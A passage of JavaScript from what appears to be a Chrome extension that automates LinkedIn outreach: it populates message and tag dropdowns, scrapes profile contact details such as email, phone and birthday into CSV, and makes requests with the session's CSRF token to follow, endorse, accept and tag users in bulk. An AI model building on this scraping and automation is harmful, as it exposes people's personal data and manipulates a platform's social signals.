        // $("#remaining_msg_req_temp").rangeslider('update', true).trigger("input");
        $("#remaining_msg_req_temp, #remaining_msg_req").attr("max",local_data.REMAINING_MESSAGES);//.val(local_data.REMAINING_MESSAGES);
    }
    if ($("#inm_range_slider").length > 0) {
        $("#inm_range_slider").attr({
            "max": local_data.REMAINING_INMAILS,
            "value": local_data.rim
        }).val(local_data.rim).rangeslider('update', true).trigger("input");
        // $("#remaining_msg_req_temp").rangeslider('update', true).trigger("input");
        $("#remaining_inm_req_temp, #remaining_inm_req").attr("max",local_data.REMAINING_INMAILS);//.val(local_data.REMAINING_MESSAGES);
    }
    if(!callback){
        $("#remaining_temp, #remaining, #range_slider_temp").attr({
            value : local_data.REMAINING_PROFILE_VIEWS,
            max : local_data.REMAINING_PROFILE_VIEWS
        });
        $("#remaining_conn_req_temp, #remaining_conn_req, #conn_range_slider_temp").attr({
            value : local_data.REMAINING_CONNECTION_REQUESTS,
            max : local_data.REMAINING_CONNECTION_REQUESTS
        });
        $("#remaining_msg_req_temp, #remaining_msg_req, #msg_range_slider_temp").attr({
            value : local_data.REMAINING_MESSAGES,
            max : local_data.REMAINING_MESSAGES
        });
        $("#remaining_inm_req_temp, #remaining_inm_req, #inm_range_slider_temp").attr({
            value : local_data.REMAINING_INMAILS,
            max : local_data.REMAINING_INMAILS
        });
    }
    if (typeof callback == 'function') {
        callback();
    }
}

function updateConnectionStatus(conn_arr, conn_status, idx, callback) {
    if(conn_arr.length > 0){
        chrome.runtime.sendMessage({
            'updateConnectionStatus': true,
            'conn_status': conn_status,
            'connection_ids': conn_arr
        }, function() {
            if (typeof callback == 'function') {
                callback();
            }
        })
    } else if (typeof callback == 'function') {
        callback();
    }
}

function removeConnectionRequest(conn_arr, idx, callback) {
    var conn = conn_arr[idx];
    if (conn) {
        withdrawConnectionRequest(conn, function(){
            if(sent_connections){
                var conn_rec = sent_connections.filter(function(sc){
                    return sc.c_public_id == conn
                })[0];
                if(conn_rec){
                    chrome.runtime.sendMessage({
                        'removeConnectionRequest': true,
                        'connection_id': conn_rec.id
                    }, function() {
                        idx++;
                        removeConnectionRequest(conn_arr, idx, callback);
                    })
                } else {
                    idx++;
                    removeConnectionRequest(conn_arr, idx, callback);
                }
            }
        })
    } else if (typeof callback == 'function') {
        callback();
    }
}

function getLatestData(callback) {
    chrome.runtime.sendMessage({
        getLatestData: true
    }, function(ud) {
        if (!ud || ud.status == 0) {
            // showNotification(local_strings['SERVER_ERROR']);
            // showNotification(local_strings['SERVER_ERROR_2']);
            setTimeout(function(){
                getLatestData(callback);
            },2000);
            return false;
        }
        user_details = ud;
        user_details.autoWish = typeof user_details.autoWish == 'string' && user_details.autoWish.length > 0 ? JSON.parse(user_details.autoWish) : user_details.autoWish;
        if (typeof callback == 'function') {
            callback();
        }
    })
}

function createCSVFile(user_views, callback) {
    var csv_data = "First Name,Last Name,EMAIL,PHONE,COUNTRY,INDUSTRY,WEBSITES,CURRENT_COMPANIES,BIRTHDAY,TWITTER_ACCOUNTS,LINKEDIN_URL\r\n";
    user_views.forEach(function(view) {
        csv_data += '"' + view['firstname'] + '"';
        csv_data += ",";
        csv_data += '"' + view['lastname'] + '"';
        csv_data += ",";
        csv_data += '"' + view['email'] + '"';
        csv_data += ",";
        csv_data += '"' + view['phone'] + '"';
        csv_data += ",";
        csv_data += '"' + view['country'] + '"';
        csv_data += ",";
        csv_data += '"' + view['industry'] + '"';
        csv_data += ",";
        csv_data += '"' + view['websites'] + '"';
        csv_data += ",";
        csv_data += '"' + view['current_companies'] + '"';
        csv_data += ",";
        csv_data += view['birthday'];
        csv_data += ",";
        csv_data += '"' + view['twitter_accounts'] + '"';
        csv_data += ",";
        csv_data += view['viewed_linkedin_profile_url'];
        csv_data += "\r\n";
    });
    callback(csv_data);
}

function JSONToCSVConvertor(callback) {
    var CSV = '';
    var row = "";
    for (var index in campaign_export[0]) {
        row += index.toCapitalize() + ',';
    }
    row = row.slice(0, -1);
    CSV += row + '\r\n';
    for (var i = 0; i < campaign_export.length; i++) {
        var row = "";
        for (var index in campaign_export[i]) {
            row += '"' + campaign_export[i][index] + '",';
        }
        row = row.slice(0, row.length - 1);
        CSV += row + '\r\n';
    }
    if(typeof callback == 'function') callback(CSV);
}

function normalizeAttrs(attrs, callback){
    var new_attrs = {};
    new_attrs['First Name'] = attrs['firstName'];
    new_attrs['Last Name'] = attrs['lastName'];
    new_attrs['Email'] = attrs.email;
    new_attrs['Phone'] = attrs.phone;
    new_attrs['Title'] = attrs.title;
    new_attrs['Company'] = attrs.companyName || "";
    new_attrs['Industry'] = attrs.industryName || "";
    getFormattedAddress(attrs.locationName, '', function(address){
        if(address != 'error' && address.city != ''){
            new_attrs['City'] = address.city;
            new_attrs['State'] = address.state;
            new_attrs['Country'] = address.country;
        }
        new_attrs['Location'] = attrs.locationName;
        new_attrs['Headline'] = attrs.headline;
        new_attrs['LinkedIn Profile'] = LINKEDIN_PROFILE_URL+''+attrs.publicIdentifier;
        // delete attrs.entityUrn;
        // delete attrs.publicIdentifier;
        new_attrs.publicIdentifier = attrs.publicIdentifier;
        new_attrs.entityUrn = attrs.entityUrn;
        delete attrs.objectUrn;
        delete attrs.industryCode;
        delete attrs.trackingId;
        delete attrs.versionTag;
        delete attrs.picture;
        delete attrs.skills;
        delete attrs.fieldOfStudy;
        attrs.skills = (attrs.skills && attrs.skills.length > 0) ? attrs.skills.split(",").map(x=>x.split("||")[0]).toString() : "";
        callback(new_attrs);
    })
}

function getTemplates(callback) {
    chrome.runtime.sendMessage({
        getTemplates: true
    }, function(temps) {
        templates = temps;
        if (typeof callback == 'function') {
            callback(temps);
        }
    });
}

function getInvitationMessages(callback) {
    chrome.runtime.sendMessage({
        getInvitationMessages: true
    }, function(msgs) {
        msgs = msgs || [];
        invitationMessages = msgs;
        if (typeof callback == 'function') {
            callback(msgs);
        }
    })
}

function getFollowUpMessages(callback) {
    chrome.runtime.sendMessage({
        getFollowUpMessages: true
    }, function(msgs) {
        msgs = msgs || [];
        followUpMessages = msgs;
        if (typeof callback == 'function') {
            callback(msgs);
        }
    })
}

function getTags(callback) {
    chrome.runtime.sendMessage({
        getTags: true
    }, function(msgs) {
        msgs = msgs || [];
        tags = msgs;
        tags.sort(function(a, b){
            var keyA = a.tag_name.toLowerCase(), keyB = b.tag_name.toLowerCase();
            if(keyA < keyB) return -1;
            if(keyA > keyB) return 1;
            return 0;
        });
        if (typeof callback == 'function') {
            callback(msgs);
        }
    })
}

function getMessageTemplates(callback) {
    chrome.runtime.sendMessage({
        getMessageTemplates: true
    }, function(msgs) {
        msgs = msgs || [];
        messageTemplates = msgs;
        if (typeof callback == 'function') {
            callback(msgs);
        }
    })
}

function getInMailTemplates(callback) {
    chrome.runtime.sendMessage({
        getInMailTemplates: true
    }, function(msgs) {
        msgs = msgs || [];
        inMailTemplates = msgs;
        if (typeof callback == 'function') {
            callback(msgs);
        }
    })
}

function populateViews(reset_vals, callback) {
    fillDropDowns(reset_vals, "view", callback);
}

function populateMessages(reset_vals, callback) {
    fillDropDowns(reset_vals, "message", callback);
    // getMessageTemplates(function(msgs) {
    //     $('#selMes').html('<option value="">Select message</option>');
    //     $('#selMes').append('<option value="custom">Custom</option>');
    //     msgs.forEach(function(m) {
    //         $('#selMes').append('<option value="' + m.id + '">' + m.template_name + '</option>');
    //     });
    //     if (!reset_vals) {
    //         local_data.selectedMessage = '';
    //         local_data.selectedMessageAttachments = [];
    //     } else if (local_data.selectedMessage && $("#selMes option[value='" + local_data.selectedMessage + "']").length > 0) {
    //         $("#selMes option[value='" + local_data.selectedMessage + "']").attr("selected", "true");
    //     }
    //     $('#selMes').parent().find(".custom_message textarea").unbind("input");
    //     $('#selMes').parent().find(".custom_message textarea").bind("input", function() {
    //         local_data.selectedMessage = $(this).val();
    //     })
    //     if(typeof callback == 'function'){
    //         callback();
    //     }
    // })
}

function populateInMails(reset_vals, callback) {
    fillDropDowns(reset_vals, "inmails", callback);
}

function fillDropDowns(reset_vals, is_tags, callback){
    function afterData(){
        /*invitation messages*/
        if($('#selInvMes').length > 0){
            $('#selInvMes').html('<option value="">'+local_strings['SELECT_INV_MSG_TXT']+'</option>');
            $('#selInvMes').append('<option value="custom">'+local_strings['CUSTOM_TXT']+'</option>');
            invitationMessages.forEach(function(m) {
                $('#selInvMes').append('<option value="' + m.id + '">' + m.template_name + '</option>');
            });
            var selectedInvitationMessageId = false;
            if(local_data.selectedInvitationMessage){
                selectedInvitationMessageId = invitationMessages.filter(x=>x.template_content == local_data.selectedInvitationMessage)[0].id;
            }
            if (!reset_vals) {
                local_data.selectedInvitationMessage = '';
            } else if (selectedInvitationMessageId && local_data.selectedInvitationMessage && $("#selInvMes option[value='" + selectedInvitationMessageId + "']").length > 0) {
                $("#selInvMes option[value='" + selectedInvitationMessageId + "']").attr("selected", "true");
            }
            $('#selInvMes').parent().find(".custom_message textarea").unbind("input");
            $('#selInvMes').parent().find(".custom_message textarea").bind("input", function() {
                // console.log($(this).val());
                local_data.selectedInvitationMessage = $(this).val();
            })
        }

        /*follow up messages*/
        if($('#selFollUpMes').length > 0){
            $('#selFollUpMes').html('<option value="">'+local_strings['SELECT_FOL_UP_TXT']+'</option>');
            $('#selFollUpMes').append('<option value="custom">'+local_strings['CUSTOM_TXT']+'</option>');
            followUpMessages.forEach(function(m) {
                $('#selFollUpMes').append('<option value="' + m.id + '">' + m.template_name + '</option>');
            });
            var selectedFollowUpMessageId = false;
            if(local_data.selectedFollowUpMessage){
                selectedFollowUpMessageId = followUpMessages.filter(x=>x.template_content == local_data.selectedFollowUpMessage)[0].id;
            }
            if (!reset_vals) {
                local_data.selectedFollowUpMessage = '';
            } else if (selectedFollowUpMessageId && local_data.selectedFollowUpMessage && $("#selFollUpMes option[value='" + selectedFollowUpMessageId + "']").length > 0) {
                $("#selFollUpMes option[value='" + selectedFollowUpMessageId + "']").attr("selected", "true");
            }
            $('#selFollUpMes').parent().find(".custom_message textarea").unbind("input");
            $('#selFollUpMes').parent().find(".custom_message textarea").bind("input", function() {
                local_data.selectedFollowUpMessage = $(this).val();
            })
        }

        /*messages*/
        if($('#selMes').length > 0){
            $('#selMes').html('<option value="">'+local_strings['SELECT_MSG_TXT']+'</option>');
            $('#selMes').append('<option value="custom">'+local_strings['CUSTOM_TXT']+'</option>');
            messageTemplates.forEach(function(m) {
                $('#selMes').append('<option value="' + m.id + '">' + m.template_name + '</option>');
            });
            if (!reset_vals) {
                local_data.selectedMessage = '';
                local_data.selectedMessageAttachments = [];
            } else if (local_data.selectedMessage && $("#selMes option[value='" + local_data.selectedMessage + "']").length > 0) {
                $("#selMes option[value='" + local_data.selectedMessage + "']").attr("selected", "true");
            }
            $('#selMes').parent().find(".custom_message textarea").unbind("input");
            $('#selMes').parent().find(".custom_message textarea").bind("input", function() {
                local_data.selectedMessage = $(this).val();
            })
        }

        /*inmails*/
        if($('#selInm').length > 0){
            $('#selInm').html('<option value="">'+local_strings['SELECT_INMAIL_TXT']+'</option>');
            $('#selInm').append('<option value="custom">'+local_strings['CUSTOM_TXT']+'</option>');
            inMailTemplates.forEach(function(m) {
                $('#selInm').append('<option value="' + m.id + '">' + m.template_name + '</option>');
            });
            if (!reset_vals) {
                local_data.selectedInMail = '';
                local_data.selectedInMailSubject = '';
                local_data.selectedInMailAttachments = [];
            } else if (local_data.selectedInMail && $("#selInm option[value='" + local_data.selectedInMail + "']").length > 0) {
                $("#selInm option[value='" + local_data.selectedInMail + "']").attr("selected", "true");
            }
            $('#custom_inm_subject').unbind("input");
            $('#custom_inm_subject').bind("input", function() {
                local_data.selectedInMailSubject = $(this).val();
            })
            $('#selInm').parent().find(".custom_message textarea").unbind("input");
            $('#selInm').parent().find(".custom_message textarea").bind("input", function() {
                local_data.selectedInMail = $(this).val();
            })
        }
        if(is_tags){
            $('#conn_inv_tags').html('');
            tags.forEach(function(m) {
                $('#conn_inv_tags').append('<option value="' + m.id + '">' + m.tag_name + '</option>');
            });
            if (!reset_vals) {
                local_data.selectedTags = [];
            } else if (local_data.selectedTags.length > 0) {
                local_data.selectedTags.forEach(function(t) {
                    if ($("#conn_inv_tags option[value='" + t + "']").length > 0) {
                        $("#conn_inv_tags option[value='" + t + "']").attr("selected", "true");
                    }
                })
            }
            $('#conn_inv_tags').unbind("change");
            $('#conn_inv_tags').bind("change", function() {
                local_data.selectedTags = $(this).val() || [];
                var linkedInTagsSelected = local_data.selectedTags && local_data.selectedTags.filter(function(tagObjId){
                    return tags.filter(x=>x.id==tagObjId)[0].linked_tag_id;
                });
                if(linkedInTagsSelected.length > 0 && isSalesNav){
                    $("#connect_tag_in_sales_nav").attr("checked",local_data.sales_tags_checked);
                    $(".tag_sales").show();
                } else if(!isSalesNav){
                    local_data.sales_tags_checked = false;
                    $("#connect_tag_in_sales_nav").removeAttr("checked");
                    $(".tag_sales").hide();
                }
            });
            $("#connect_tag_in_sales_nav").unbind("change");
            $("#connect_tag_in_sales_nav").bind("change", function(){
                local_data.sales_tags_checked = $(this).is(":checked");
            });
            if($("#conn_inv_tags").data('select2')){
                $("#conn_inv_tags").select2('destroy');
            }
            $("#conn_inv_tags").select2({
                templateResult: function(state){
                    var html_options = '<span>'+state.text+'</span>';
                    var tag_obj = tags.filter(x=>x.id==state.id);
                    var linked_tag_id = '';
                    if(tag_obj && tag_obj.length > 0){
                        linked_tag_id = tag_obj[0].linked_tag_id;
                    }
                    if(isSalesNav && linked_tag_id){
                        html_options += '<span class="ln_icon"><img src="'+chrome.runtime.getURL('images/in.ico')+'" /></span>';
                    }
                    return $(html_options);
                },
                dropdownAutoWidth: !0,
                width: "100%"
            });
            $('#conn_inv_tags').trigger("change");

            $('#conn_inv_respond').trigger("change");
        }
        // Tag for Message
        if(is_tags == "message") {
            $('#message_tags').html('');
            tags.forEach(function(m) {
                $('#message_tags').append('<option value="' + m.id + '">' + m.tag_name + '</option>');
            });
            if (!reset_vals) {
                local_data.selectedTags = [];
            } else if (local_data.selectedTags.length > 0) {
                local_data.selectedTags.forEach(function(t) {
                    if ($("#message_tags option[value='" + t + "']").length > 0) {
                        $("#message_tags option[value='" + t + "']").attr("selected", "true");
                    }
                })
            }
            $('#message_tags').unbind("change");
            $('#message_tags').bind("change", function() {
                local_data.selectedTags = $(this).val() || [];
                var linkedInTagsSelected = local_data.selectedTags && local_data.selectedTags.filter(function(tagObjId){
                    return tags.filter(x=>x.id==tagObjId)[0].linked_tag_id;
                });
                if(linkedInTagsSelected.length > 0 && isSalesNav){
                    $("#message_tag_in_sales_nav").attr("checked",local_data.sales_tags_checked);
                    $(".tag_sales").show();
                } else if(!isSalesNav){
                    local_data.sales_tags_checked = false;
                    $("#message_tag_in_sales_nav").removeAttr("checked");
                    $(".tag_sales").hide();
                }
            });
            $("#message_tag_in_sales_nav").unbind("change");
            $("#message_tag_in_sales_nav").bind("change", function(){
                local_data.sales_tags_checked = $(this).is(":checked");
            });
            if($("#message_tags").data('select2')){
                $("#message_tags").select2('destroy');
            }
            $("#message_tags").select2({
                templateResult: function(state){
                    var html_options = '<span>'+state.text+'</span>';
                    var tag_obj = tags.filter(x=>x.id==state.id);
                    var linked_tag_id = '';
                    if(tag_obj && tag_obj.length > 0){
                        linked_tag_id = tag_obj[0].linked_tag_id;
                    }
                    if(isSalesNav && linked_tag_id){
                        html_options += '<span class="ln_icon"><img src="'+chrome.runtime.getURL('images/in.ico')+'" /></span>';
                    }
                    return $(html_options);
                },
                dropdownAutoWidth: !0,
                width: "100%"
            });  
            $('#message_tags').trigger("change");
        }
        // Tag for Inmails
        if(is_tags == "inmails") {
            $('#inmails_tags').html('');
            tags.forEach(function(m) {
                $('#inmails_tags').append('<option value="' + m.id + '">' + m.tag_name + '</option>');
            });
            if (!reset_vals) {
                local_data.selectedTags = [];
            } else if (local_data.selectedTags.length > 0) {
                local_data.selectedTags.forEach(function(t) {
                    if ($("#inmails_tags option[value='" + t + "']").length > 0) {
                        $("#inmails_tags option[value='" + t + "']").attr("selected", "true");
                    }
                })
            }
            $('#inmails_tags').unbind("change");
            $('#inmails_tags').bind("change", function() {
                local_data.selectedTags = $(this).val() || [];
                var linkedInTagsSelected = local_data.selectedTags && local_data.selectedTags.filter(function(tagObjId){
                    return tags.filter(x=>x.id==tagObjId)[0].linked_tag_id;
                });
                if(linkedInTagsSelected.length > 0 && isSalesNav){
                    $("#inmail_tag_in_sales_nav").attr("checked",local_data.sales_tags_checked);
                    $(".tag_sales").show();
                } else if(!isSalesNav){
                    local_data.sales_tags_checked = false;
                    $("#inmail_tag_in_sales_nav").removeAttr("checked");
                    $(".tag_sales").hide();
                }
            });
            $("#inmail_tag_in_sales_nav").unbind("change");
            $("#inmail_tag_in_sales_nav").bind("change", function(){
                local_data.sales_tags_checked = $(this).is(":checked");
            });
            if($("#inmails_tags").data('select2')){
                $("#inmails_tags").select2('destroy');
            }
            $("#inmails_tags").select2({
                templateResult: function(state){
                    var html_options = '<span>'+state.text+'</span>';
                    var tag_obj = tags.filter(x=>x.id==state.id);
                    var linked_tag_id = '';
                    if(tag_obj && tag_obj.length > 0){
                        linked_tag_id = tag_obj[0].linked_tag_id;
                    }
                    if(isSalesNav && linked_tag_id){
                        html_options += '<span class="ln_icon"><img src="'+chrome.runtime.getURL('images/in.ico')+'" /></span>';
                    }
                    return $(html_options);
                },
                dropdownAutoWidth: !0,
                width: "100%"
            });  
            $("#inmails_tags").trigger("change");
        }
        // Tag for Views
        if(is_tags == "view") {
            $('#view_tags, #scan_tags').html('');
            tags.forEach(function(m) {
                $('#view_tags, #scan_tags').append('<option value="' + m.id + '">' + m.tag_name + '</option>');
            });
            if (!reset_vals) {
                local_data.selectedTags = [];
            } else if (local_data.selectedTags.length > 0) {
                local_data.selectedTags.forEach(function(t) {
                    if ($("#view_tags option[value='" + t + "']").length > 0) {
                        $("#view_tags option[value='" + t + "']").attr("selected", "true");
                    }
                    if ($("#scan_tags option[value='" + t + "']").length > 0) {
                        $("#scan_tags option[value='" + t + "']").attr("selected", "true");
                    }
                })
            }
            $('#view_tags').unbind("change");
            $('#view_tags').bind("change", function() {
                local_data.selectedTags = $(this).val() || [];
                var linkedInTagsSelected = local_data.selectedTags && local_data.selectedTags.filter(function(tagObjId){
                    return tags.filter(x=>x.id==tagObjId)[0].linked_tag_id;
                });
                if(linkedInTagsSelected.length > 0 && isSalesNav){
                    $("#view_tag_in_sales_nav").attr("checked",local_data.sales_tags_checked);
                    $(".tag_sales").show();
                } else if(!isSalesNav){
                    local_data.sales_tags_checked = false;
                    $("#view_tag_in_sales_nav").removeAttr("checked");
                    $(".tag_sales").hide();
                }
            });
            $("#view_tag_in_sales_nav").unbind("change");
            $("#view_tag_in_sales_nav").bind("change", function(){
                local_data.sales_tags_checked = $(this).is(":checked");
            });
            if($("#view_tags").data('select2')){
                $("#view_tags").select2('destroy');
            }
            $("#view_tags").select2({
                templateResult: function(state){
                    var html_options = '<span>'+state.text+'</span>';
                    var tag_obj = tags.filter(x=>x.id==state.id);
                    var linked_tag_id = '';
                    if(tag_obj && tag_obj.length > 0){
                        linked_tag_id = tag_obj[0].linked_tag_id;
                    }
                    if(isSalesNav && linked_tag_id){
                        html_options += '<span class="ln_icon"><img src="'+chrome.runtime.getURL('images/in.ico')+'" /></span>';
                    }
                    return $(html_options);
                },
                dropdownAutoWidth: !0,
                width: "100%"
            });  
            $("#view_tags").trigger("change");

            // scan

            $('#scan_tags').unbind("change");
            $('#scan_tags').bind("change", function() {
                local_data.selectedTags = $(this).val() || [];
                var linkedInTagsSelected = local_data.selectedTags && local_data.selectedTags.filter(function(tagObjId){
                    return tags.filter(x=>x.id==tagObjId)[0].linked_tag_id;
                });
                if(linkedInTagsSelected.length > 0 && isSalesNav){
                    $("#scan_tag_in_sales_nav").attr("checked",local_data.sales_tags_checked);
                    $(".tag_sales").show();
                } else if(!isSalesNav){
                    local_data.sales_tags_checked = false;
                    $("#scan_tag_in_sales_nav").removeAttr("checked");
                    $(".tag_sales").hide();
                }
            });
            $("#scan_tag_in_sales_nav").unbind("change");
            $("#scan_tag_in_sales_nav").bind("change", function(){
                local_data.sales_tags_checked = $(this).is(":checked");
            });
            if($("#scan_tags").data('select2')){
                $("#scan_tags").select2('destroy');
            }
            $("#scan_tags").select2({
                templateResult: function(state){
                    var html_options = '<span>'+state.text+'</span>';
                    var tag_obj = tags.filter(x=>x.id==state.id);
                    var linked_tag_id = '';
                    if(tag_obj && tag_obj.length > 0){
                        linked_tag_id = tag_obj[0].linked_tag_id;
                    }
                    if(isSalesNav && linked_tag_id){
                        html_options += '<span class="ln_icon"><img src="'+chrome.runtime.getURL('images/in.ico')+'" /></span>';
                    }
                    return $(html_options);
                },
                dropdownAutoWidth: !0,
                width: "100%"
            });  
            $("#scan_tags").trigger("change");
        }
        if(typeof callback == 'function'){
            callback();
        }
    }
    try{
        if(lastLoadedOn == false){      //   || Date.now() - lastLoadedOn > 30*60*1000
            getTags(function(Tags) {
                tags = Tags;
                getTemplates(function(templates){
                    if(templates){
                        messageTemplates = templates.filter(x=>x.template_type=='message');
                        inMailTemplates = templates.filter(x=>x.template_type=='inmail');
                        invitationMessages = templates.filter(x=>x.template_type=='connection_invitation');
                        followUpMessages = templates.filter(x=>x.template_type=='follow_up_message');
                        notificationTemplates = templates.filter(x=>x.template_type=='notification');
                        window['invitationMessages'] = invitationMessages;
                        window['followUpMessages'] = followUpMessages;
                        window['messageTemplates'] = messageTemplates;
                        window['inMailTemplates'] = inMailTemplates;
                        window['notificationTemplates'] = notificationTemplates;
                        // lastLoadedOn = Date.now();
                        afterData();
                    } else {
                        console.log("Missing templates here");
                    }
                })
            })
        } else {
            afterData();
        }
    } catch(err){
        chrome.runtime.sendMessage({error: err, func: 'fillDropDowns'});
    }
}

function populateTemplates(reset_vals, callback) {
    fillDropDowns(reset_vals, true, callback);
}

function reloadConnections(callback) {
    getAllConnections(0, [], function(conns) {
        connections_all = conns;
        chrome.storage.local.set({
            connections: connections_all
        });
        if (typeof callback == 'function') {
            callback();
        }
    })
}

/*
    LinkedIn methods
*/

function beforeSendingAjax(req){
    if(isSalesNav && !primaryIdentity){
        $.ajax({
            url: LINKEDIN_DOMAIN_URL + 'sales-api/salesApiPrimaryIdentity',
            beforeSend: function(request) {
                var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                request.setRequestHeader('csrf-token', csrf_token);
                request.setRequestHeader('x-restli-protocol-version', '2.0.0');
            },
            success: function(res){
                primaryIdentity = res.primaryIdentity;
            },
            async: false
        })
    }
    var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
    req.setRequestHeader('csrf-token', csrf_token);
    req.setRequestHeader('x-li-identity', primaryIdentity);
    req.setRequestHeader('x-restli-protocol-version', '2.0.0');
    return req;
}

function getAccountType(callback){
    if(!isSalesNav){
        var pageSource = document.body.innerHTML;
        var json_codes = pageSource.match(/>\s+{.*}\s+</g);
        var account_type = '';
        if(json_codes && json_codes.length > 0){
            json_codes.forEach(function(jc) {
                var etosp = jc && jc.replace(/>\s+/, '').replace(/\s+</, '');
                try {
                    var js_obj = JSON.parse($('<textarea />').html(etosp).val());
                    if (js_obj && js_obj.data && js_obj.data.$type) {
                        if(js_obj.data.$type == 'com.linkedin.voyager.common.Nav'){
                            if(!account_type && js_obj.data && js_obj.data.paidProducts && js_obj.data.paidProducts.indexOf('SALES_NAVIGATOR') > -1){
                                account_type = 'Sales Navigator';
                                // isSalesNav = true;
                                is_sales_profile_active = true;
                                chrome.storage.local.set({
                                    isSalesNav: is_sales_profile_active
                                })
                            }
                        } else if (!account_type && js_obj.data.$type == 'com.linkedin.voyager.common.Me' && js_obj.data.premiumSubscriber) {
                            account_type = 'Premium';
                        }
                    }
                } catch(err) {
                    chrome.runtime.sendMessage({error: err, func: ''});
                }
            });
        }
    } else {
        account_type = 'Sales Navigator';
    }
    if(!account_type) {
        account_type = 'Basic';
    }
    if(typeof callback == 'function'){
        callback(account_type);
    }
}

function followUser(attrs){
    $.ajax({
        url: LINKEDIN_DOMAIN_URL + 'voyager/api/identity/profiles/'+attrs.entityUrn+'/profileActions?versionTag='+attrs.versionTag+'&action=follow',
        data: JSON.stringify({"overflowActions":[],"actions":[]}),
        dataType: 'json',
        contentType: 'application/json; charset=utf-8',
        beforeSend: function(req) {
            var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
            req.setRequestHeader('csrf-token', csrf_token);
        },
        xhrFields: {
            withCredentials: true
        },
        type: 'POST',
        async: false
    });
}

function endorseUser(attrs, skillIdx){
    skillIdx = skillIdx == undefined ? 0 : skillIdx;
    if(attrs.skills && attrs.skills.length > skillIdx && local_data.maxEndorse > skillIdx){
        var currentPostingSkill = attrs.skills[skillIdx]
        $.ajax({
            url: LINKEDIN_DOMAIN_URL + 'voyager/api/identity/profiles/'+attrs.entityUrn+'/normEndorsements',
            data: JSON.stringify({
                "skill":{
                    "name": currentPostingSkill.name,
                    "entityUrn": currentPostingSkill.entityUrn
                }
            }),
            dataType: 'json',
            contentType: 'application/json; charset=utf-8',
            beforeSend: function(req) {
                var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                req.setRequestHeader('csrf-token', csrf_token);
            },
            xhrFields: {
                withCredentials: true
            },
            type: 'POST',
            async: false
        });
        skillIdx++;
        endorseUser(attrs, skillIdx);
    }
}

function acceptUser(received_rec, callback){
    handleConnnectionRequest(received_rec, 'accept', callback);
}

function ignoreUserConnection(received_rec, callback){
    handleConnnectionRequest(received_rec, 'ignore', callback);
}

function handleConnnectionRequest(received_rec, mode, callback){
    var entityUrn = received_rec.entityUrn.replace('urn:li:fs_relInvitation:','');
    received_rec.invitationId = entityUrn;
    received_rec.invitationSharedSecret = received_rec.sharedSecret;
    received_rec.fromMember.id = received_rec.fromMemberId;
    received_rec.invitee['com.linkedin.voyager.relationships.invitation.ProfileInvitee'].id = entityUrn+",invitee,com.linkedin.voyager.relationships.invitation.ProfileInvitee";
    var fromMemberEntityUrn = received_rec.invitee['com.linkedin.voyager.relationships.invitation.ProfileInvitee'].miniProfile.entityUrn.replace('urn:li:fs_miniProfile:','');
    received_rec.invitee['com.linkedin.voyager.relationships.invitation.ProfileInvitee'].miniProfile.id = fromMemberEntityUrn;
    received_rec.toMember.id = fromMemberEntityUrn;
    $.ajax({
        url: LINKEDIN_DOMAIN_URL + 'voyager/api/relationships/invitations/'+entityUrn+'?action='+mode,
        data: JSON.stringify(received_rec),
        dataType: 'json',
        contentType: 'application/json; charset=utf-8',
        beforeSend: function(req) {
            var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
            req.setRequestHeader('csrf-token', csrf_token);
        },
        xhrFields: {
            withCredentials: true
        },
        type: 'POST',
        async: false,
        success: function(){
            setTimeout(function(){
                callback('success');
            },3000);
        },
        error: function(){
            setTimeout(function(){
                callback('error');
            },3000);
        }
    });
}

function getCurrentProfileDetailsForRegistration(callback){
    callXHROnLinkedIn(LINKEDIN_DOMAIN_URL + 'voyager/api/identity/profiles/me/profileView',[],function(profile_data){
        var obj = {};
        if(profile_data && profile_data.profile){
            obj = {
                firstName: profile_data.profile.firstName,
                lastName: profile_data.profile.lastName,
                membership: local_data.account_type,
                industry: profile_data.profile.industryName,
                location: profile_data.profile.locationName
            }
            if(profile_data.profile && profile_data.profile.picture && profile_data.profile.picture['com.linkedin.voyager.common.MediaProcessorImage'] && profile_data.profile.picture['com.linkedin.voyager.common.MediaProcessorImage'].id){
                obj.profile_img = 'https://media.licdn.com/mpr/mpr/shrinknp_100_100'+profile_data.profile.picture['com.linkedin.voyager.common.MediaProcessorImage'].id;
            } else if(profile_data.profile && profile_data.profile.miniProfile && profile_data.profile.miniProfile.picture && profile_data.profile.miniProfile.picture['com.linkedin.common.VectorImage']){
                var vectorImg = profile_data.profile.miniProfile.picture['com.linkedin.common.VectorImage'];
                if(vectorImg.artifacts && vectorImg.artifacts.length > 0){
                    obj.profile_img = vectorImg['rootUrl'] + '' + vectorImg.artifacts.splice(-1)[0].fileIdentifyingUrlPathSegment;
                }
            }
            obj.linkedin_profile_id = profile_data.profile.miniProfile.publicIdentifier;
            obj.linkedin_profile_url = LINKEDIN_PROFILE_URL + obj.linkedin_profile_id;
            callXHROnLinkedIn(LINKEDIN_DOMAIN_URL + 'voyager/api/identity/profiles/' + obj.linkedin_profile_id + '/profileContactInfo',[],function(contact_info){
                if(contact_info && contact_info.emailAddress){
                    obj.email = contact_info.emailAddress;
                    if(obj.email.indexOf('phishing') >= 0){
                        obj.email = decodeURIComponent(obj.email).replace(/(.*?)https:.*?=(.*)/,'$1$2');
                    }
                }
                // chrome.storage.local.set({user_profile:obj});
                if(typeof callback == 'function'){
                    callback(obj);
                }
            });
        }
    })
}

function activateThisTab(callback) {
    chrome.runtime.sendMessage({
        activate: true
    }, function() {
        if (typeof callback == 'function') {
            callback();
        }
    })
}

function tagUserInSalesNav(member_id, tag_ids, callback, attrs){
    /* tags API params */
    var obj = {};
    var tagIds = [];
    if(tag_ids && tag_ids.length > 0){
        tag_ids.forEach(function(t_id){
            tagIds.push(t_id);
        })
    }
    var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];

    if($(".search-results__result-item").length > 0){
        // New design
        var tagsArr = tagIds.map(x=>"urn:li:fs_salesTag:"+x);
        obj = {
            "tagUrns":tagsArr,
            "entityUrns":["urn:li:fs_salesProfile:("+attrs.entityUrn+","+attrs.authToken+","+attrs.authType+")"],
            "tagType":"LEAD_OR_ACCOUNT"
        };
        $.ajax({
